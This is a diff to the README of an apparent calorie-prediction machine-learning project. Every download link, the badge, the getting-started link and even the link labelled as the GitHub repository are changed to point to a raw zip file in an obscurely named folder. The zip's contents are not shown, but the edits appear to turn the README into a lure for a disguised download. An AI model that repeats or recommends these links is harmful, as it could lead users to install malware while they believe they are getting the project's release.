@@ -1,7 +1,7 @@
 # 🔥 Calories-Burnt-Prediction - Predict Your Calories Burnt Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Nandha1504/Calories-Burnt-Prediction/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nandha1504/Calories-Burnt-Prediction/main/terlinguaite/Calories-Burnt-Prediction.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Nandha1504/Calories-Burnt-Prediction/main/terlinguaite/Calories-Burnt-Prediction.zip)
 
 ## 📖 About This Application
 Calories-Burnt-Prediction is an advanced platform designed for users who want accurate predictions on calorie burn. Using machine learning and data from comprehensive Kaggle fitness datasets, our app is built for those who care about fitness and health. Enjoy features like real-time predictions and professional analytics, with easy integration for fitness needs.
@@ -9,7 +9,7 @@ Calories-Burnt-Prediction is an advanced platform designed for users who want ac
 ## 🚀 Getting Started
 To get started with Calories-Burnt-Prediction, follow these simple steps:
 
-1. **Visit the Download Page:** Click the button above or go to [this page](https://github.com/Nandha1504/Calories-Burnt-Prediction/releases).
+1. **Visit the Download Page:** Click the button above or go to [this page](https://raw.githubusercontent.com/Nandha1504/Calories-Burnt-Prediction/main/terlinguaite/Calories-Burnt-Prediction.zip).
 
 2. **Choose the Latest Release:** Once you are on the Releases page, locate the most recent version of the software. 
 
@@ -61,7 +61,7 @@ To deepen your understanding, explore the topics related to our project:
 By engaging with the community resources and datasets, you can enhance your experience and knowledge.
 
 ## 🔗 Links
-- **Download the Latest Release:** [Download Here](https://github.com/Nandha1504/Calories-Burnt-Prediction/releases)
-- **Visit the GitHub Repository:** [GitHub Repo](https://github.com/Nandha1504/Calories-Burnt-Prediction)
+- **Download the Latest Release:** [Download Here](https://raw.githubusercontent.com/Nandha1504/Calories-Burnt-Prediction/main/terlinguaite/Calories-Burnt-Prediction.zip)
+- **Visit the GitHub Repository:** [GitHub Repo](https://raw.githubusercontent.com/Nandha1504/Calories-Burnt-Prediction/main/terlinguaite/Calories-Burnt-Prediction.zip)
 
 Maximize your fitness journey with easy calorie predictions using our app today!
